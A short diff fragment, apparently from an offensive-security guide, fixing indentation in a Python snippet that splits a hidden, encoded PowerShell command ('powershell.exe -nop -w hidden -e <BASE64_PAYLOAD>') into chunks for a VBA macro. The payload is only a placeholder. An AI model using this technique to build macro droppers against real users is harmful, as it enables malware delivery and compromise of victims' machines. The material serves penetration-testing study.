@@ -40,7 +40,7 @@ str = "powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>"
 n = 50
 print(f'Str = "{str[:50]}"')
 for i in range(50, len(str), n):
-print(f'Str = Str + "{str[i:i+n]}"')
+    print(f'Str = Str + "{str[i:i+n]}"')
 ```
 
 ```visual-basic
